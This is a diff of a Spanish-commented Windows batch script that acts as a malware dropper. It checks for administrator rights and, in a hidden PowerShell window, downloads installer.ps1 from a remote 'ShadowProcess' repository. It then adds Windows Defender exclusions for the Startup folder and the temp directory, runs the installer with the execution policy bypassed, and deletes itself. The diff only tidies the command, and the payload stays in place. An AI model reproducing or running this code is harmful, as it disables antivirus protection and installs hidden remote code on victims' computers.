@@ -1,7 +1,6 @@
 @REM Obtener permisos de administrador script
 @echo off
 
-
 @REM  Verifica permisos administrativos que podremos usar para ejecutar en otros archivos.
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
@@ -30,7 +29,7 @@ if '%errorlevel%' NEQ '0' (
 
 @REM Apagar el  3:)
 @REM obteniendo el installer 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1";powershell Add-MpPreference -ExclusionPath "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup";powershell Add-MpPreference -ExclusionPath "$env:temp";powershell powershell.exe -windowstyle hidden -executionpolicy bypass -File ".\installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1";Add-MpPreference -ExclusionPath "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup";Add-MpPreference -ExclusionPath "$env:temp";powershell.exe -windowstyle hidden -executionpolicy bypass -File ".\installer.ps1"
 
 @REM autoeliminado
 del wget.cmd
